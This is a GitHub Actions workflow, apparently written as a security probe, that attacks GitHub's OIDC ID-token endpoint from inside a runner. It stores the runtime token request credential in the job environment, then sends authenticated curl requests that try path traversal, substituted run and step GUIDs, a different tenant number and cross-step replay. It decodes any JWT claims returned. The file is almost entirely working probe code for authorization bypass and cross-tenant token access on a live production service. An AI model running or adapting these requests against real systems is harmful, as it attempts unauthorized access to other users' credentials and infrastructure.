name: OIDCProbe
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: Capture URL in step 1
        id: step1
        run: |
          echo "STEP1_URL=$ACTIONS_ID_TOKEN_REQUEST_URL" >> $GITHUB_ENV
          echo "STEP1_TOKEN=$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> $GITHUB_ENV
          echo STEP1_URL=$ACTIONS_ID_TOKEN_REQUEST_URL
          echo ORCHESTRATION_ID=$ACTIONS_ORCHESTRATION_ID
      - name: Path traversal and BOLA probe
        run: |
          BURL=$(echo $STEP1_URL | sed 's/?api-version.*//')
          echo BURL=$BURL
          echo ''
          echo '--- ORIGINAL ---'
          O=$(curl -sf -H "Authorization: bearer $STEP1_TOKEN" "${BURL}?api-version=2.0&audience=api.github.com")
          echo $O | python3 -c "import json,sys; t=json.load(sys.stdin).get('value','ERR'); p=t.split('.')[1]; import base64; b=p+'='*(-len(p)%4); c=json.loads(base64.b64decode(b)); print('sub:', c.get('sub')); print('jti:', c.get('jti')); print('ref:', c.get('ref'))" 2>/dev/null
          echo ''
          echo '--- TRAVERSAL: idtoken/../idtoken ---'
          TURL=$(echo $BURL | sed 's|/idtoken/|/idtoken/../idtoken/|')
          echo TURL=$TURL
          TB=$(curl -s -H "Authorization: bearer $STEP1_TOKEN" "${TURL}?api-version=2.0&audience=api.github.com")
          echo TRAV_RESPONSE=$(echo $TB | head -c 500)
          echo TRAV_HAS_VALUE=$(echo $TB | python3 -c "import json,sys; print('YES' if 'value' in json.load(sys.stdin) else 'NO')" 2>/dev/null || echo PARSE_ERR)
          echo ''
          echo '--- DIFFERENT RUN GUID (all zeros) ---'
          RG=$(echo $BURL | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | head -1)
          ZURL=$(echo $BURL | sed "s|$RG|00000000-0000-0000-0000-000000000001|")
          Z=$(curl -s -w '\nHTTP_STATUS:%{http_code}' -H "Authorization: bearer $STEP1_TOKEN" "${ZURL}?api-version=2.0&audience=api.github.com")
          echo ZERO_RUN_GUID_RESPONSE=$Z
          echo ''
          echo '--- DIFFERENT STEP GUID (all zeros) ---'
          SG=$(echo $BURL | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | tail -1)
          SURL=$(echo $BURL | sed "s|$SG|00000000-0000-0000-0000-000000000002|")
          S=$(curl -s -w '\nHTTP_STATUS:%{http_code}' -H "Authorization: bearer $STEP1_TOKEN" "${SURL}?api-version=2.0&audience=api.github.com")
          echo ZERO_STEP_GUID_RESPONSE=$S
          echo ''
          echo '--- TENANT 0 instead of 140 ---'
          CURR_TENANT=$(echo $BURL | grep -oP '(?<=\.com/)\d+')
          T0URL=$(echo $BURL | sed "s|/$CURR_TENANT/|/0/|")
          T0=$(curl -s -w '\nHTTP_STATUS:%{http_code}' -H "Authorization: bearer $STEP1_TOKEN" "${T0URL}?api-version=2.0&audience=api.github.com")
          echo TENANT0_RESPONSE=$T0
          echo ''
          echo '--- STEP1 URL IN STEP2 (cross-step replay) ---'
          echo STEP1_URL_VALUE=$STEP1_URL
          echo CURRENT_URL=$ACTIONS_ID_TOKEN_REQUEST_URL
          echo URLS_SAME=$(test "$STEP1_URL" = "$ACTIONS_ID_TOKEN_REQUEST_URL" && echo YES || echo NO)
          CS=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${STEP1_URL}&audience=api.github.com")
          echo CROSS_STEP_JTI=$(echo $CS | python3 -c "import json,sys; t=json.load(sys.stdin).get('value',''); p=t.split('.')[1]; import base64; b=p+'='*(-len(p)%4); c=json.loads(base64.b64decode(b)); print(c.get('jti','ERR'))" 2>/dev/null)
